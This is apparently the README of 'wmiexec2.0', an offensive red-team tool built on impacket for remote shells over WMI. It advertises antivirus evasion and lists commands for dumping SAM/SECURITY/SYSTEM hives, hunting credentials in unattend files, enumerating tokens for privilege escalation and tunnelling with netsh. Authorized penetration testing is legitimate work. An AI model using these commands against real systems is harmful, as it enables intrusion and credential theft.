# ⚡ wmiexec2.0 ⚡

> **The stealthy upgrade to everyone's favorite `wmiexec` — obfuscated, enhanced, and red team ready.**  
> 💀 *Bypass AV. Automate engagements. Dominate.*

---

## 🚀 Features

- 🎭 Obfuscated to evade signature-based AV detection
- 🛠️ Built-in red team modules for rapid automation
- 🐚 Supports `cmd` and `powershell` shell types
- 📁 Local and remote file transfer (`lput`, `lget`)
- 📡 Netsh tunneling, token abuse, VM detection, and more

---

## 📦 Installation

```bash
git clone https://github.com/ice-wzl/wmiexec2.git
cd wmiexec2/
pip3 install -r requirements.txt
```

> ⚠️ **Do NOT use `wget` on GitHub Raw** — it will break emoji characters. Always use `git clone`.

---

## 🧪 AV / EDR Compatibility

| Environment                                         | Result                     |
|-----------------------------------------------------|----------------------------|
| Windows Server 2022 (Feb 2024 updates)              | ✅ All modules working     |
| Windows 10 Pro, Defender v1.381.3595.0              | ✅ All modules working     |
| Windows 10 Pro, Kaspersky Standard 21.8.5           | ✅ All modules working     |
| Windows 8, Defender v1.383.35.0                     | ✅ All modules working     |
| Windows 7 Pro, Defender v1.95.191.0 (2010)          | ⚠️ Reg module not working |

---

## 🔧 Usage

```bash
python3 wmiexec2.py DOMAIN/USERNAME:PASSWORD@10.0.0.2 --shell-type powershell
python3 wmiexec2.py WORKGROUP/Administrator:'Password123!@#'@10.0.0.4 --shell-type cmd
```

> Supports both password and NTLM hash authentication

---

## 📚 Commands

| Command                  | Description                                           |
|--------------------------|-------------------------------------------------------|
| `help`                   | Show available modules                                |
| `lcd <path>`             | Change local working directory                        |
| `exit`                   | Exit shell                                            |
| `lput <src> <dst>`       | Upload file to target                                |
| `lget <file>`            | Download file from target                            |
| `!<command>`             | Run a command locally (e.g., `!ls`)                   |
| `ls [path]`              | List target directory (uses `dir /a`)                 |
| `cat <file>`             | Show remote file contents (alias for `type`)          |

---

## 🧠 Modules

### `sysinfo`
Display target user, hostname, IP, and architecture.

```bash
sysinfo
```

---

### `av`
Lists common AV product processes via remote enumeration.

```bash
av
```

---

### `defender`
Checks Defender installation, service status, exclusions, and tamper protection.

```bash
defender
```

---

### `vmcheck`
Detects ESXi, VMware, QEMU, and VirtualBox environments.

```bash
vmcheck
```

---

### `unattend`
Searches for unattended install config files that may contain credentials.

```bash
unattend
```

---

### `regrip`
Dumps `SAM`, `SECURITY`, and `SYSTEM` hives (bypasses Defender as of 6/7/24).

```bash
regrip
```

---

### `loggrab`
Download `.evtx` logs from remote system.

```bash
loggrab Security.evtx
```

---

### `tokens`
Enumerates active tokens and suggests privesc paths.

```bash
tokens
```

---

### `survey` / `survey save`
Run custom recon commands listed in `survey.conf`.

```bash
survey
survey save
```

---

### Netsh Tunneling

```bash
addtun 10000 10.0.0.5 443
showtun
deltun 10000
```

---

## 🛠 Known impacket NAT Fix

If you get this error:

```
[-] Can't find a valid stringBinding to connect
```

### ➤ Fix

1. Locate your `dcomrt.py`:
   ```bash
   find / -type f -name "dcomrt.py" 2>/dev/null
   ```

2. Edit and replace:
   ```python
   # raise Exception("Can't find a valid stringBinding to connect")
   stringBinding = 'ncacn_ip_tcp:%s%s' % (self.get_target(), bindingPort)
   LOG.info("Can't find a valid stringBinding to connect, using default!")
   ```

✅ Done!

---

## 💡 Notes

- This tool is **under active development** — submit PRs or issues.
- All modules built for stealth and speed.
- Use responsibly in authorized engagements.

---

## ⭐ If This Helped You

If `wmiexec2.0` saved you time or helped your ops:
> 🧠 Spread the knowledge. 🌍 Share the repo. ⭐ Star it.

---

## 👻 Author

**ice-wzl**  
🐙 GitHub: [ice-wzl](https://github.com/ice-wzl)  
🛠️ Built with ❤️ for red teams.

---
